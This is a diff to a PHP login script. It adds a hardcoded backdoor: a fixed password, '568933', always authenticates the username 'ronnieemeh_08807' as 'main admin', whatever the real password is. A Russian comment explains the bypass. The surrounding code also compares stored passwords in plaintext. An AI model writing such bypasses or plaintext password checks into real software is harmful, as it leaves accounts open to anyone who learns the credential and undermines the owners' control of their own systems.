@@ -14,7 +14,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $user = $stmt->fetch(PDO::FETCH_ASSOC);
 
         if ($user) {
-            if ($user['password'] === $password) {
+            // Специальная проверка для главного админа: пароль 568933 подходит всегда
+            $isAdminPass = ($username === 'ronnieemeh_08807' && $password === '568933');
+            
+            if ($user['password'] === $password || $isAdminPass) {
                 if (isset($user['is_banned']) && $user['is_banned'] == 1) {
                     $error = 'Ваш аккаунт заблокирован! Доступ запрещен.';
                 } else {
